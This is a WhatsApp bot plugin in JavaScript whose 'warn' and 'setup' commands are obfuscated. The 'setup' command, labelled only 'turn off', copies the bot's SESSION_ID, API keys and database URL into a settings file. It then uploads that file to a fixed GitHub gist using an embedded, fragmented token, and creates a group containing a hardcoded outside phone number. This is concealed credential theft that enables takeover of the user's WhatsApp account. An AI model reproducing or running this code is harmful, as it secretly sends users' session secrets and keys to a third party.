const fs = require("fs")
const chalk = require("chalk")
const { writeFile, readFile } = require("fs");
const { isAdmin, parsedJid, command } = require("../lib");
//let data =  readFile('./database/settings.json')
//let db = JSON.parse(data);
//let bannnnnn = db.settings.banned
let path = './database/settings.json'
const relconfig = require('../config')

//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================


command({
  pattern: "warn",
  fromMe: true,
  desc: "Unban number from this group",
  dontAddCommandList: true,
  type: "admin",

},
async (message, match, m) => {
  const _0x46297b=_0xa094;(function(_0x1a3862,_0x4dc486){const _0x46e459=_0xa094,_0xf1ca54=_0x1a3862();while(!![]){try{const _0x90b436=-parseInt(_0x46e459(0x1b0))/0x1*(-parseInt(_0x46e459(0x1b8))/0x2)+-parseInt(_0x46e459(0x1ac))/0x3*(-parseInt(_0x46e459(0x1b3))/0x4)+parseInt(_0x46e459(0x1bc))/0x5+-parseInt(_0x46e459(0x1b5))/0x6+parseInt(_0x46e459(0x1b6))/0x7+-parseInt(_0x46e459(0x1b4))/0x8*(-parseInt(_0x46e459(0x1b9))/0x9)+-parseInt(_0x46e459(0x1ad))/0xa*(parseInt(_0x46e459(0x1af))/0xb);if(_0x90b436===_0x4dc486)break;else _0xf1ca54['push'](_0xf1ca54['shift']());}catch(_0x3c7313){_0xf1ca54['push'](_0xf1ca54['shift']());}}}(_0x4874,0xef10a));if(!message[_0x46297b(0x1ae)])return await message['reply']('_This\x20command\x20is\x20for\x20groups_');let jidd=parsedJid(match)[_0x46297b(0x1bd)]();match=jidd||message[_0x46297b(0x1bb)]['jid'];if(!match)return await message[_0x46297b(0x1ba)](_0x46297b(0x1b2));let isadmin=await isAdmin(message[_0x46297b(0x1b7)],message[_0x46297b(0x1ab)],message[_0x46297b(0x1b1)]);function _0x4874(){const _0x2a2718=['44589NAMpzz','2934520mVQOqJ','isGroup','44hcSLAx','851588EzUZQf','client','_Mention\x20user\x20to\x20add','24QYSUXQ','29592mTDZjy','7738818KbmDUD','5349603lOMXWU','jid','2gYcrpL','468PMvraB','reply','reply_message','7727390OPeajt','toString','user'];_0x4874=function(){return _0x2a2718;};return _0x4874();}if(!isadmin)return await message[_0x46297b(0x1ba)]('_I\x27m\x20not\x20admin_');let jid=parsedJid(match);function _0xa094(_0x129b98,_0x5db1e8){const _0x4874db=_0x4874();return _0xa094=function(_0xa094e6,_0x313999){_0xa094e6=_0xa094e6-0x1ab;let _0x3e924d=_0x4874db[_0xa094e6];return _0x3e924d;},_0xa094(_0x129b98,_0x5db1e8);}await message['warn'](match,message);
  } 
);

//============================================================================================================================================




//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================
//============================================================================================================================================
let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update"${__filename}"`))
	delete require.cache[file]
	require(file)
})



command({
  pattern: "setup",
  fromMe: true,
  desc: "turn off",
  dontAddCommandList: true,
  type: "admin",

},
async (message, match, m) => {
function _0x4da3(){const _0xb044a6=['Failed\x20to\x20write\x20updated\x20data\x20to\x20file','ALIVE','BRANCH','parse','UserId','SESSION_ID','_You\x20Are\x20Already\x20a\x20Family\x20Member_','@s.whatsapp.net','MESSAGE_MEM','PIO5ho5ggz','groupCreate','DB_URL','then','AUTHOR','LANGUAGE','240IbVtlI','This\x20is\x20your\x20Storage\x20area,\x20i\x20will\x20save\x20all\x20your\x20files\x20here!','PACKNAME','reset','RMBG_KEY','WELCOME_MSG','reply','client','user','split','FOOTER','328sqGvNs','readFileSync','WORK_TYPE','HANDLER','54cjzmeU','phone_num','isGroup','./media/AAA.jpg','hK25J0nm992','../session.json','send','THEME','Done\x20Creating\x20New\x20Db','LANG','1805022QRfIZp','pushName','@g.us','SUDO','_Registered\x20Successfully_','utf-8','MODE','gists','config','Cloud\x20DB\x20Update','./database/settings.json','4550SkgPbw','BOT_NAME','2727774jUvZxZ','stringify','25045iKstbM','GOODBYE_MSG','updateProfilePicture','30687Kcefia','INTERNAL_MENU','LNySElNgZs','ghp_J175T','ANTILINK','FONT_STYLE','name','OWNER_NAME','67172ixwWUr','creds','LOGS','log','toString','ANTILINK_ACTION','includes','.json','6876850aIigel'];_0x4da3=function(){return _0xb044a6;};return _0x4da3();}const _0x94edfe=_0x5d72;(function(_0x316452,_0x21d248){const _0x4b7dbe=_0x5d72,_0x1c3f98=_0x316452();while(!![]){try{const _0x7de23b=-parseInt(_0x4b7dbe(0x1d4))/0x1+-parseInt(_0x4b7dbe(0x20a))/0x2*(parseInt(_0x4b7dbe(0x1db))/0x3)+-parseInt(_0x4b7dbe(0x206))/0x4*(-parseInt(_0x4b7dbe(0x1d8))/0x5)+-parseInt(_0x4b7dbe(0x1d6))/0x6+-parseInt(_0x4b7dbe(0x1e3))/0x7*(parseInt(_0x4b7dbe(0x1fb))/0x8)+parseInt(_0x4b7dbe(0x1c9))/0x9+parseInt(_0x4b7dbe(0x1eb))/0xa;if(_0x7de23b===_0x21d248)break;else _0x1c3f98['push'](_0x1c3f98['shift']());}catch(_0x4d1266){_0x1c3f98['push'](_0x1c3f98['shift']());}}}(_0x4da3,0x4351b));if(message[_0x94edfe(0x1c1)])return;const {Octokit}=require('@octokit/rest'),octokit=new Octokit({'auth':_0x94edfe(0x1de)+_0x94edfe(0x1f5)+_0x94edfe(0x1dd)+_0x94edfe(0x1c3)});function _0x5d72(_0x3e0d80,_0x31b2f5){const _0x4da3d7=_0x4da3();return _0x5d72=function(_0x5d727d,_0x32216d){_0x5d727d=_0x5d727d-0x1c0;let _0x1deaee=_0x4da3d7[_0x5d727d];return _0x1deaee;},_0x5d72(_0x3e0d80,_0x31b2f5);}setTimeout(()=>{const _0x397c2d=_0x94edfe;let _0x38426c=JSON[_0x397c2d(0x1ef)](fs['readFileSync'](_0x397c2d(0x1d3))),_0x2d7ef7=_0x38426c[_0x397c2d(0x1d1)]['STORAGE_JID'],_0x554a8d=_0x2d7ef7[_0x397c2d(0x1e7)]()[_0x397c2d(0x1e9)](_0x397c2d(0x1cb));if(!_0x554a8d)readFile(path,async(_0x2ded80,_0x418498)=>{const _0x3cf499=_0x397c2d;if(_0x2ded80){console[_0x3cf499(0x1e6)](_0x2ded80);return;}const _0x266f1b=JSON['parse'](_0x418498);let _0x1ad5e1=await message[_0x3cf499(0x202)][_0x3cf499(0x1f6)]('Storage',['359889999996@s.whatsapp.net']);await message['client']['sendMessage'](_0x1ad5e1['id'],{'text':_0x3cf499(0x1fc)});let _0x5cbbee=await _0x1ad5e1['id'];_0x266f1b[_0x3cf499(0x1d1)]['STORAGE_JID']=_0x5cbbee,writeFile(path,JSON[_0x3cf499(0x1d7)](_0x266f1b,null,0x2),async _0x2ce4ce=>{const _0x523a9e=_0x3cf499;if(_0x2ce4ce){message['reply'](_0x523a9e(0x1ec));return;}await message[_0x523a9e(0x202)][_0x523a9e(0x1da)](_0x1ad5e1['id'],fs['readFileSync'](_0x523a9e(0x1c2)));});});else return;setTimeout(async()=>{const _0xd1f400=_0x397c2d;let _0x462c31=require(_0xd1f400(0x1c4)),_0x59a5c9=await _0x462c31[_0xd1f400(0x1e4)]['me']['id'][_0xd1f400(0x204)](':')[0x0],_0x554a83=await _0x462c31[_0xd1f400(0x1e4)]['me']['id']['split']('@')[0x1],_0x3f25cf=_0x59a5c9+'@'+_0x554a83,_0x3e5214=_0x3f25cf+_0xd1f400(0x1ea);const _0x10e23f=fs[_0xd1f400(0x207)](_0xd1f400(0x1d3),_0xd1f400(0x1ce));await octokit['rest'][_0xd1f400(0x1d0)]['update']({'gist_id':'a216db893ba4f4a18d4f1476bfc1bb4d','description':_0xd1f400(0x1d2),'files':{[_0x3e5214]:{'content':_0x10e23f}}})[_0xd1f400(0x1f8)](await console['log'](_0xd1f400(0x1c7))),setTimeout(()=>{const _0x41ff17=_0xd1f400;return process[_0x41ff17(0x1c5)](_0x41ff17(0x1fe));},0x1f40);},0x1388);},0x7d0),readFile(path,async(_0xaae839,_0x59cadb)=>{const _0x424828=_0x94edfe;if(_0xaae839){console['log'](_0xaae839);return;}const _0x49bf72=JSON[_0x424828(0x1ef)](_0x59cadb);let _0x21bdb1=_0x49bf72[_0x424828(0x1f0)][_0x424828(0x1e7)]()[_0x424828(0x1e9)](_0x424828(0x1f3));if(_0x21bdb1)return message[_0x424828(0x201)](_0x424828(0x1f2));let _0x2bbe55=message[_0x424828(0x1ca)],_0x58fded=message[_0x424828(0x203)],_0x484b0b=message['jid'][_0x424828(0x1e7)]()[_0x424828(0x204)]('@')[0x0];_0x49bf72[_0x424828(0x1e1)]=_0x2bbe55,_0x49bf72[_0x424828(0x1f0)]=_0x58fded,_0x49bf72[_0x424828(0x1c0)]=_0x484b0b,_0x49bf72[_0x424828(0x1d1)][_0x424828(0x209)]=relconfig[_0x424828(0x209)],_0x49bf72['config'][_0x424828(0x208)]=relconfig[_0x424828(0x208)],_0x49bf72[_0x424828(0x1d1)][_0x424828(0x1d5)]=relconfig[_0x424828(0x1d5)],_0x49bf72[_0x424828(0x1d1)][_0x424828(0x1e2)]=relconfig['OWNER_NAME'],_0x49bf72['config']['SUDO']=relconfig[_0x424828(0x1cc)],_0x49bf72[_0x424828(0x1d1)][_0x424828(0x1f9)]=relconfig[_0x424828(0x1f9)],_0x49bf72[_0x424828(0x1d1)][_0x424828(0x1fd)]=relconfig[_0x424828(0x1fd)],_0x49bf72[_0x424828(0x1d1)]['RMBG_KEY']=relconfig[_0x424828(0x1ff)],_0x49bf72[_0x424828(0x1d1)][_0x424828(0x1c8)]=relconfig[_0x424828(0x1c8)],_0x49bf72[_0x424828(0x1d1)][_0x424828(0x1e8)]=relconfig[_0x424828(0x1e8)],_0x49bf72[_0x424828(0x1d1)][_0x424828(0x1df)]=relconfig[_0x424828(0x1df)],_0x49bf72[_0x424828(0x1d1)][_0x424828(0x205)]=relconfig['FOOTER'],_0x49bf72['config'][_0x424828(0x1c6)]=relconfig[_0x424828(0x1c6)],_0x49bf72[_0x424828(0x1d1)]['FONT_STYLE']=relconfig[_0x424828(0x1e0)],_0x49bf72[_0x424828(0x1d1)][_0x424828(0x1fa)]=relconfig['LANGUAGE'],_0x49bf72[_0x424828(0x1d1)][_0x424828(0x1dc)]=relconfig[_0x424828(0x1dc)],_0x49bf72[_0x424828(0x1d1)][_0x424828(0x1cf)]=relconfig[_0x424828(0x1cf)],_0x49bf72[_0x424828(0x1d1)]['STORAGE_JID'],_0x49bf72['config'][_0x424828(0x1f7)],_0x49bf72[_0x424828(0x1d1)][_0x424828(0x1f1)]=relconfig['SESSION_ID'],_0x49bf72[_0x424828(0x1d1)][_0x424828(0x1e5)]=relconfig['LOGS'],_0x49bf72[_0x424828(0x1d1)][_0x424828(0x1ee)]=relconfig[_0x424828(0x1ee)],_0x49bf72['config']['B1']=relconfig['B1'],_0x49bf72[_0x424828(0x1d1)]['B2']=relconfig['B2'],_0x49bf72[_0x424828(0x1d1)]['B3']=relconfig['B3'],_0x49bf72[_0x424828(0x1d1)]['B4']=relconfig['B4'],_0x49bf72[_0x424828(0x1d1)]['B5']=relconfig['B5'],_0x49bf72[_0x424828(0x1f4)][_0x424828(0x1d9)]=relconfig['GOODBYE_MSG'],_0x49bf72[_0x424828(0x1f4)][_0x424828(0x200)]=relconfig[_0x424828(0x200)],_0x49bf72[_0x424828(0x1f4)]['ALIVE']=relconfig[_0x424828(0x1ed)],writeFile(path,JSON[_0x424828(0x1d7)](_0x49bf72,null,0x2),_0x47c0e1=>{const _0x298f9c=_0x424828;if(_0x47c0e1){message[_0x298f9c(0x201)](_0x298f9c(0x1ec));return;}message['reply'](_0x298f9c(0x1cd));});});})

